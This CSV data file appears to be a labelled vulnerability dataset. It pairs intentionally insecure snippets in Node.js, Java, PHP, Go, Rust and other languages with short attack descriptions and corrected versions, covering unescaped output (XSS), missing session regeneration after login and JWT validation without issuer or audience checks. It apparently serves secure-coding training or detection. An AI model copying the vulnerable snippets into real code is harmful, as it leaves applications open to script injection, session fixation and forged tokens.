vuln-970,Node.js,Insecure Output Encoding,Improper encoding of output data.,res.send(`<div>${req.query.input}</div>`);,Inject XSS payloads in output.,Encode: res.send(`<div>${escapeHtml(req.query.input)}</div>`),res.send(`<div>${req.query.input}</div>`);,True,True,False,False,42,False,False,True,Other,1
vuln-972,Java,Insecure Output Encoding,Unescaped user input in response.,"out.write(""<div>"" + request.getParameter(""input"") + ""</div>"");",Inject XSS payloads.,"Encode: out.write(""<div>"" + StringEscapeUtils.escapeHtml4(request.getParameter(""input"")) + ""</div>"")","out.write(""<div>"" + request.getParameter(""input"") + ""</div>"");",True,False,False,False,62,False,True,True,Other,1
vuln-973,PHP,Insecure Output Encoding,Unescaped user input in HTML output.,"echo ""<div>{$_GET['input']}</div>"";",Execute XSS via unescaped input.,"Encode: echo ""<div>"" . htmlspecialchars($_GET['input'], ENT_QUOTES, 'UTF-8') . ""</div>"";","echo ""<div>{$_GET['input']}</div>"";",True,False,False,False,35,False,True,False,Other,1
vuln-974,Ruby,Insecure Output Encoding,Unescaped user input in HTML.,<%= params[:input] %>,Inject XSS payloads.,Encode: <%= h params[:input] %>,<%= params[:input] %>,True,False,False,False,21,False,False,False,Other,1
vuln-975,Go,Insecure Output Encoding,Unescaped user input in HTML output.,"fmt.Fprintf(w, ""<div>%s</div>"", r.URL.Query().Get(""input""))",Execute XSS via unescaped input.,"Encode: fmt.Fprintf(w, ""<div>%s</div>"", html.EscapeString(r.URL.Query().Get(""input"")))","fmt.Fprintf(w, ""<div>%s</div>"", r.URL.Query().Get(""input""))",True,True,False,False,59,False,True,True,Other,1
vuln-976,C# (.NET),Insecure Output Encoding,Unescaped user input in HTML.,"@Request.Query[""input""]",Inject XSS payloads.,"Encode: @Html.Encode(Request.Query[""input""])","@Request.Query[""input""]",True,True,False,False,23,False,True,False,Other,1
vuln-977,Kotlin,Insecure Output Encoding,Unescaped user input in HTML output.,"call.respondHtml { div { +call.parameters[""input""]!! } }",Execute XSS via unescaped input.,"Encode: div { +htmlEscape(call.parameters[""input""]!!) }","call.respondHtml { div { +call.parameters[""input""]!! } }",True,False,False,False,56,False,True,True,Other,1
vuln-979,Rust,Insecure Output Encoding,Unescaped user input in HTML output.,"res.render_text(format!(""<div>{}</div>"", req.param(""input"")?))",Execute XSS via unescaped input.,"Encode: res.render_text(format!(""<div>{}</div>"", html_escape::encode_text(req.param(""input"")?)))","res.render_text(format!(""<div>{}</div>"", req.param(""input"")?))",True,False,False,False,62,False,True,False,Other,1
vuln-980,Elixir,Insecure Output Encoding,Unescaped user input in HTML.,"<div><%= params[""input""] %></div>",Inject XSS payloads.,"Encode: <div><%= Phoenix.HTML.escape(params[""input""]) %></div>","<div><%= params[""input""] %></div>",True,False,False,False,33,False,True,False,Other,1
vuln-981,Perl,Insecure Output Encoding,Unescaped user input in HTML output.,"$r->print(""<div>"" . $r->param('input') . ""</div>"");",Execute XSS via unescaped input.,"Encode: $r->print(""<div>"" . HTML::Entities::encode($r->param('input')) . ""</div>"");","$r->print(""<div>"" . $r->param('input') . ""</div>"");",True,False,False,False,51,False,True,False,Other,1
vuln-982,Node.js,Insecure Session Regeneration,Not regenerating session IDs after login.,req.session.user = user; res.redirect('/dashboard');,Session fixation attacks.,Regenerate: req.session.regenerate(() => { req.session.user = user; res.redirect('/dashboard'); }),req.session.user = user; res.redirect('/dashboard');,True,False,False,False,52,False,True,False,Authentication,1
vuln-983,Python,Insecure Session Regeneration,No session ID regeneration after authentication.,session['user'] = user; return redirect('/dashboard'),Exploit session fixation.,Regenerate: session.regenerate(); session['user'] = user,session['user'] = user; return redirect('/dashboard'),False,False,False,False,53,False,True,False,Authentication,1
vuln-984,Java,Insecure Session Regeneration,Not regenerating session after login.,"session.setAttribute(""user"", user); response.sendRedirect(""/dashboard"");",Session fixation attacks.,"Regenerate: session.invalidate(); request.getSession(true).setAttribute(""user"", user)","session.setAttribute(""user"", user); response.sendRedirect(""/dashboard"");",False,False,False,False,72,False,True,False,Authentication,1
vuln-985,PHP,Insecure Session Regeneration,No session ID regeneration after authentication.,$_SESSION['user'] = $user; header('Location: /dashboard');,Exploit session fixation.,Regenerate: session_regenerate_id(true); $_SESSION['user'] = $user,$_SESSION['user'] = $user; header('Location: /dashboard');,False,False,False,False,58,False,True,False,Authentication,1
vuln-986,Ruby,Insecure Session Regeneration,Not regenerating session after login.,session[:user] = user; redirect_to '/dashboard',Session fixation attacks.,Regenerate: reset_session; session[:user] = user,session[:user] = user; redirect_to '/dashboard',False,False,False,False,47,False,True,False,Authentication,1
vuln-987,Go,Insecure Session Regeneration,No session ID regeneration after authentication.,"session.Values[""user""] = user; session.Save(r, w); http.Redirect(w, r, ""/dashboard"", 302)",Exploit session fixation.,"Regenerate: session = sessions.NewSession(store, ""session""); session.Values[""user""] = user","session.Values[""user""] = user; session.Save(r, w); http.Redirect(w, r, ""/dashboard"", 302)",False,False,False,False,89,False,True,False,Authentication,1
vuln-988,C# (.NET),Insecure Session Regeneration,Not regenerating session after login.,"HttpContext.Session.SetString(""user"", user.Id); return Redirect(""/dashboard"");",Session fixation attacks.,"Regenerate: HttpContext.Session.Clear(); HttpContext.Session.SetString(""user"", user.Id)","HttpContext.Session.SetString(""user"", user.Id); return Redirect(""/dashboard"");",False,False,False,False,78,False,True,False,Authentication,1
vuln-989,Kotlin,Insecure Session Regeneration,No session ID regeneration after authentication.,"call.sessions.set(UserSession(user.id)); call.respond(redirect(""/dashboard""))",Exploit session fixation.,Regenerate: call.sessions.clear<UserSession>(); call.sessions.set(UserSession(user.id)),"call.sessions.set(UserSession(user.id)); call.respond(redirect(""/dashboard""))",False,False,False,False,77,False,True,False,Authentication,1
vuln-990,Scala,Insecure Session Regeneration,Not regenerating session after login.,"Ok().withSession(""user"" -> user.id.toString)",Session fixation attacks.,"Regenerate: Ok().withNewSession.withSession(""user"" -> user.id.toString)","Ok().withSession(""user"" -> user.id.toString)",False,False,False,False,44,False,True,False,Authentication,1
vuln-991,Rust,Insecure Session Regeneration,No session ID regeneration after authentication.,"req.session()?.set(""user"", user.id)?; res.redirect(""/dashboard"")",Exploit session fixation.,"Regenerate: req.session()?.clear()?; req.session()?.set(""user"", user.id)?","req.session()?.set(""user"", user.id)?; res.redirect(""/dashboard"")",True,False,False,False,64,False,True,False,Authentication,1
vuln-992,Elixir,Insecure Session Regeneration,Not regenerating session after login.,"put_session(conn, :user, user.id) |> redirect(to: ""/dashboard"")",Session fixation attacks.,"Regenerate: configure_session(conn, renew: true) |> put_session(:user, user.id)","put_session(conn, :user, user.id) |> redirect(to: ""/dashboard"")",False,False,False,False,63,False,True,False,Authentication,1
vuln-993,Perl,Insecure Session Regeneration,No session ID regeneration after authentication.,$r->session->{user} = $user->{id}; $r->redirect('/dashboard');,Exploit session fixation.,Regenerate: $r->session->clear; $r->session->{user} = $user->{id},$r->session->{user} = $user->{id}; $r->redirect('/dashboard');,False,False,False,False,62,False,True,False,Authentication,1
vuln-994,Node.js,Insecure Token Validation,Not validating token issuer or audience.,"jwt.verify(token, secret, (err, payload) => { if (!err) proceed(payload); });",Use forged tokens from untrusted issuers.,"Validate: jwt.verify(token, secret, { issuer: 'myapp', audience: 'myapp' }, ...)","jwt.verify(token, secret, (err, payload) => { if (!err) proceed(payload); });",False,False,False,False,77,False,False,False,Authentication,1
vuln-995,Python,Insecure Token Validation,Missing issuer/audience validation for JWT.,"payload = jwt.decode(token, secret, algorithms=['HS256'])",Forge tokens with invalid issuer/audience.,"Validate: jwt.decode(token, secret, algorithms=['HS256'], options={'require': ['iss', 'aud'], 'issuer': 'myapp', 'audience': 'myapp'})","payload = jwt.decode(token, secret, algorithms=['HS256'])",False,False,False,False,57,False,True,False,Authentication,1
vuln-996,Java,Insecure Token Validation,Not validating JWT issuer or audience.,JWT.require(Algorithm.HMAC256(secret)).build().verify(token);,Use tokens from untrusted sources.,"Validate: JWT.require(Algorithm.HMAC256(secret)).withIssuer(""myapp"").withAudience(""myapp"").build().verify(token)",JWT.require(Algorithm.HMAC256(secret)).build().verify(token);,False,False,False,False,61,False,False,False,Authentication,1
vuln-997,PHP,Insecure Token Validation,Missing issuer/audience validation.,"$payload = JWT::decode($token, new Key($secret, 'HS256'));",Forge tokens with invalid issuer/audience.,"Validate: JWT::decode($token, new Key($secret, 'HS256'), ['iss' => 'myapp', 'aud' => 'myapp'])","$payload = JWT::decode($token, new Key($secret, 'HS256'));",False,False,False,False,58,False,True,False,Authentication,1
vuln-998,Ruby,Insecure Token Validation,Not validating token issuer or audience.,"payload = JWT.decode(token, secret, true, algorithm: 'HS256')",Use forged tokens from untrusted issuers.,"Validate: JWT.decode(token, secret, true, algorithm: 'HS256', iss: 'myapp', aud: 'myapp')","payload = JWT.decode(token, secret, true, algorithm: 'HS256')",False,False,False,False,61,False,True,False,Authentication,1
vuln-999,Go,Insecure Token Validation,Missing issuer/audience validation for JWT.,"token, _ := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) { return secretKey, nil })",Forge tokens with invalid issuer/audience.,"Validate: jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) { if token.Claims.(jwt.MapClaims)[""iss""] != ""myapp"" || token.Claims.(jwt.MapClaims)[""aud""] != ""myapp"" { return nil, errors.New(""invalid iss/aud"") } return secretKey, nil })","token, _ := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) { return secretKey, nil })",False,False,False,False,105,False,False,False,Authentication,1
vuln-1000,C# (.NET),Insecure Token Validation,Not validating JWT issuer or audience.,"new JwtSecurityTokenHandler().ValidateToken(token, new TokenValidationParameters { ValidateIssuerSigningKey = true, IssuerSigningKey = key }, out _);",Use tokens from untrusted sources.,"Validate: new TokenValidationParameters { ValidateIssuer = true, ValidIssuer = ""myapp"", ValidateAudience = true, ValidAudience = ""myapp"", IssuerSigningKey = key }","new JwtSecurityTokenHandler().ValidateToken(token, new TokenValidationParameters { ValidateIssuerSigningKey = true, IssuerSigningKey = key }, out _);",True,False,False,False,149,True,False,False,Authentication,1
